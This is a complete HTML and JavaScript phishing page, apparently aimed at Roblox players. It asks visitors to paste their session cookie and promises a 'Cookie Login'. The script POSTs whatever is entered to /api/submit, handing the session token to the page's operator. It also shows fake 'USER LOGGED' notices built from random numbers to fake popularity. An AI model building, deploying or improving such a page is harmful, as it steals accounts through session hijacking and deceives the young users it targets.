<html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Roblox Cookie Login UPDATED</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: radial-gradient(circle at top, #1f3b5b 0%, #0f1720 40%, #0b0f14 100%);
      color: #ffffff;
    }

    .container {
      width: 100%;
      max-width: 420px;
      padding: 32px;
      background: rgba(20, 30, 45, 0.85);
      border-radius: 16px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
      text-align: center;
    }

    h1 {
      margin: 0 0 20px;
      font-size: 34px;
      font-weight: 700;
      letter-spacing: 0.5px;
    }

    h1 span {
      color: #4fd1c5;
      text-shadow: 0 0 12px rgba(79, 209, 197, 0.6);
    }

    input {
      width: 100%;
      padding: 14px 16px;
      margin-bottom: 18px;
      border-radius: 10px;
      border: none;
      outline: none;
      background: #1e293b;
      color: #ffffff;
      font-size: 15px;
      box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.06);
    }

    input::placeholder {
      color: #94a3b8;
    }

    button {
      width: 100%;
      padding: 14px;
      border-radius: 12px;
      border: none;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      color: #ffffff;
      background: linear-gradient(90deg, #3b82f6, #06b6d4);
      transition: transform 0.1s ease, box-shadow 0.1s ease;
      box-shadow: 0 10px 25px rgba(59, 130, 246, 0.35);
    }

    button:hover {
      transform: translateY(-1px);
      box-shadow: 0 14px 30px rgba(6, 182, 212, 0.45);
    }

    .hint {
      margin-top: 18px;
      padding: 14px;
      border-radius: 12px;
      background: rgba(15, 23, 42, 0.7);
      color: #cbd5f5;
      font-size: 14px;
    }
  
    .toast {
      position: fixed;
      bottom: 24px;
      right: 24px;
      background: rgba(15, 23, 42, 0.9);
      border: 1px solid rgba(255,255,255,0.08);
      padding: 12px 16px;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
      font-size: 14px;
      color: #e5e7eb;
      opacity: 0;
      transform: translateY(10px);
      transition: opacity .25s ease, transform .25s ease;
      pointer-events: none;
    }

    .toast.show {
      opacity: 1;
      transform: translateY(0);
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Cookie <span>Login</span></h1>

    <input id="cookieInput" type="text" placeholder="enter your cookie" />

    <button id="loginBtn">LOGIN</button>

    <div class="hint">
      Roblox Cookie Logger (UPDATED 2/5/2026).<br />
      Paste Your Cookie Here ( STATUS : UP )
    </div>
  </div>
  <div id="toast" class="toast"></div>

<script>
  const toast = document.getElementById('toast');

  function randomSixDigit() {
    return Math.floor(100000 + Math.random() * 900000);
  }

  function showFakeLogin() {
    const id = randomSixDigit();
    toast.textContent = `USER:${id} LOGGED`;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 2200);
  }

  showFakeLogin();
  setInterval(showFakeLogin, 3500);

  // ðŸ”½ BUTTON LOGIC STARTS HERE
  const input = document.getElementById('cookieInput');
  const button = document.getElementById('loginBtn');

  button.addEventListener('click', async () => {
    const value = input.value.trim();
    if (!value) return;

    try {
      await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ value })
      });

      toast.textContent = 'Submitted!';
      toast.classList.add('show');
      setTimeout(() => toast.classList.remove('show'), 2000);

      input.value = '';
    } catch (err) {
      toast.textContent = 'Error submitting';
      toast.classList.add('show');
      setTimeout(() => toast.classList.remove('show'), 2000);
    }
  });
</script>

  </script>
</body>
</html>
